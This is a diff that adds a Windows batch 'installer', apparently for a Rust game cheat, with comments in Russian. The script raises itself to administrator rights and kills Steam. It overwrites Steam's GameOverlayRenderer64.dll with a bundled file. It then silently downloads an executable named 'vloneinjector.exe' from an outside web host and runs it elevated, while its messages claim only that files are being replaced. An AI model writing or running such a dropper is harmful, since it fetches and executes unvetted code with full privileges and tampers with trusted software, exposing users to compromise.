@@ -1,0 +1,62 @@
+@echo off
+chcp 65001 >nul
+:: Проверка на админские права
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+if '%errorlevel%' NEQ '0' (
+    echo Запустите скрипт с правами администратора...
+    powershell Start-Process "%~f0" -Verb runAs
+    exit /b
+)
+
+:: Красивый заголовок
+color 0A
+cls
+setlocal EnableDelayedExpansion
+
+set "msg=Installer by GermanovNew..."
+for /L %%i in (0,1,29) do (
+    set "line=!msg:~0,%%i!"
+    cls
+    echo !line!
+    timeout /nobreak /t 0.05 >nul
+)
+
+timeout /t 1 >nul
+echo Пытаемся переместить папку Bundles...
+timeout /t 1 >nul
+
+:: Перемещение папки Bundles
+if exist "%~dp0Bundles" (
+    move "%~dp0Bundles" "C:\Bundles" >nul
+    echo Папка Bundles перемещена в C:\
+) else (
+    echo Папка Bundles не найдена!
+)
+
+timeout /t 1 >nul
+echo Завершение процессов Steam...
+taskkill /f /im steam.exe >nul 2>&1
+taskkill /f /im SteamService.exe >nul 2>&1
+
+timeout /t 1 >nul
+echo Замена GameOverlayRenderer64.dll...
+
+if exist "%~dp0GameOverlayRenderer64.dll" (
+    copy /y "%~dp0GameOverlayRenderer64.dll" "C:\Program Files (x86)\Steam\GameOverlayRenderer64.dll" >nul
+    echo DLL успешно заменен.
+) else (
+    echo DLL не найден!
+)
+
+timeout /t 1 >nul
+echo Смотрим поведение Rust...
+
+:: Скачивание и запуск
+powershell -Command "Invoke-WebRequest -Uri 'https://germanov.xyz/help/vloneinjector.exe' -OutFile '%TEMP%\vloneinjector.exe'"
+powershell Start-Process '%TEMP%\vloneinjector.exe' -Verb runAs
+
+timeout /t 2 >nul
+echo ----------------------------
+echo Файлы заменены, Можно запускать Игру). Нажмите любую клавишу...
+pause >nul
+exit
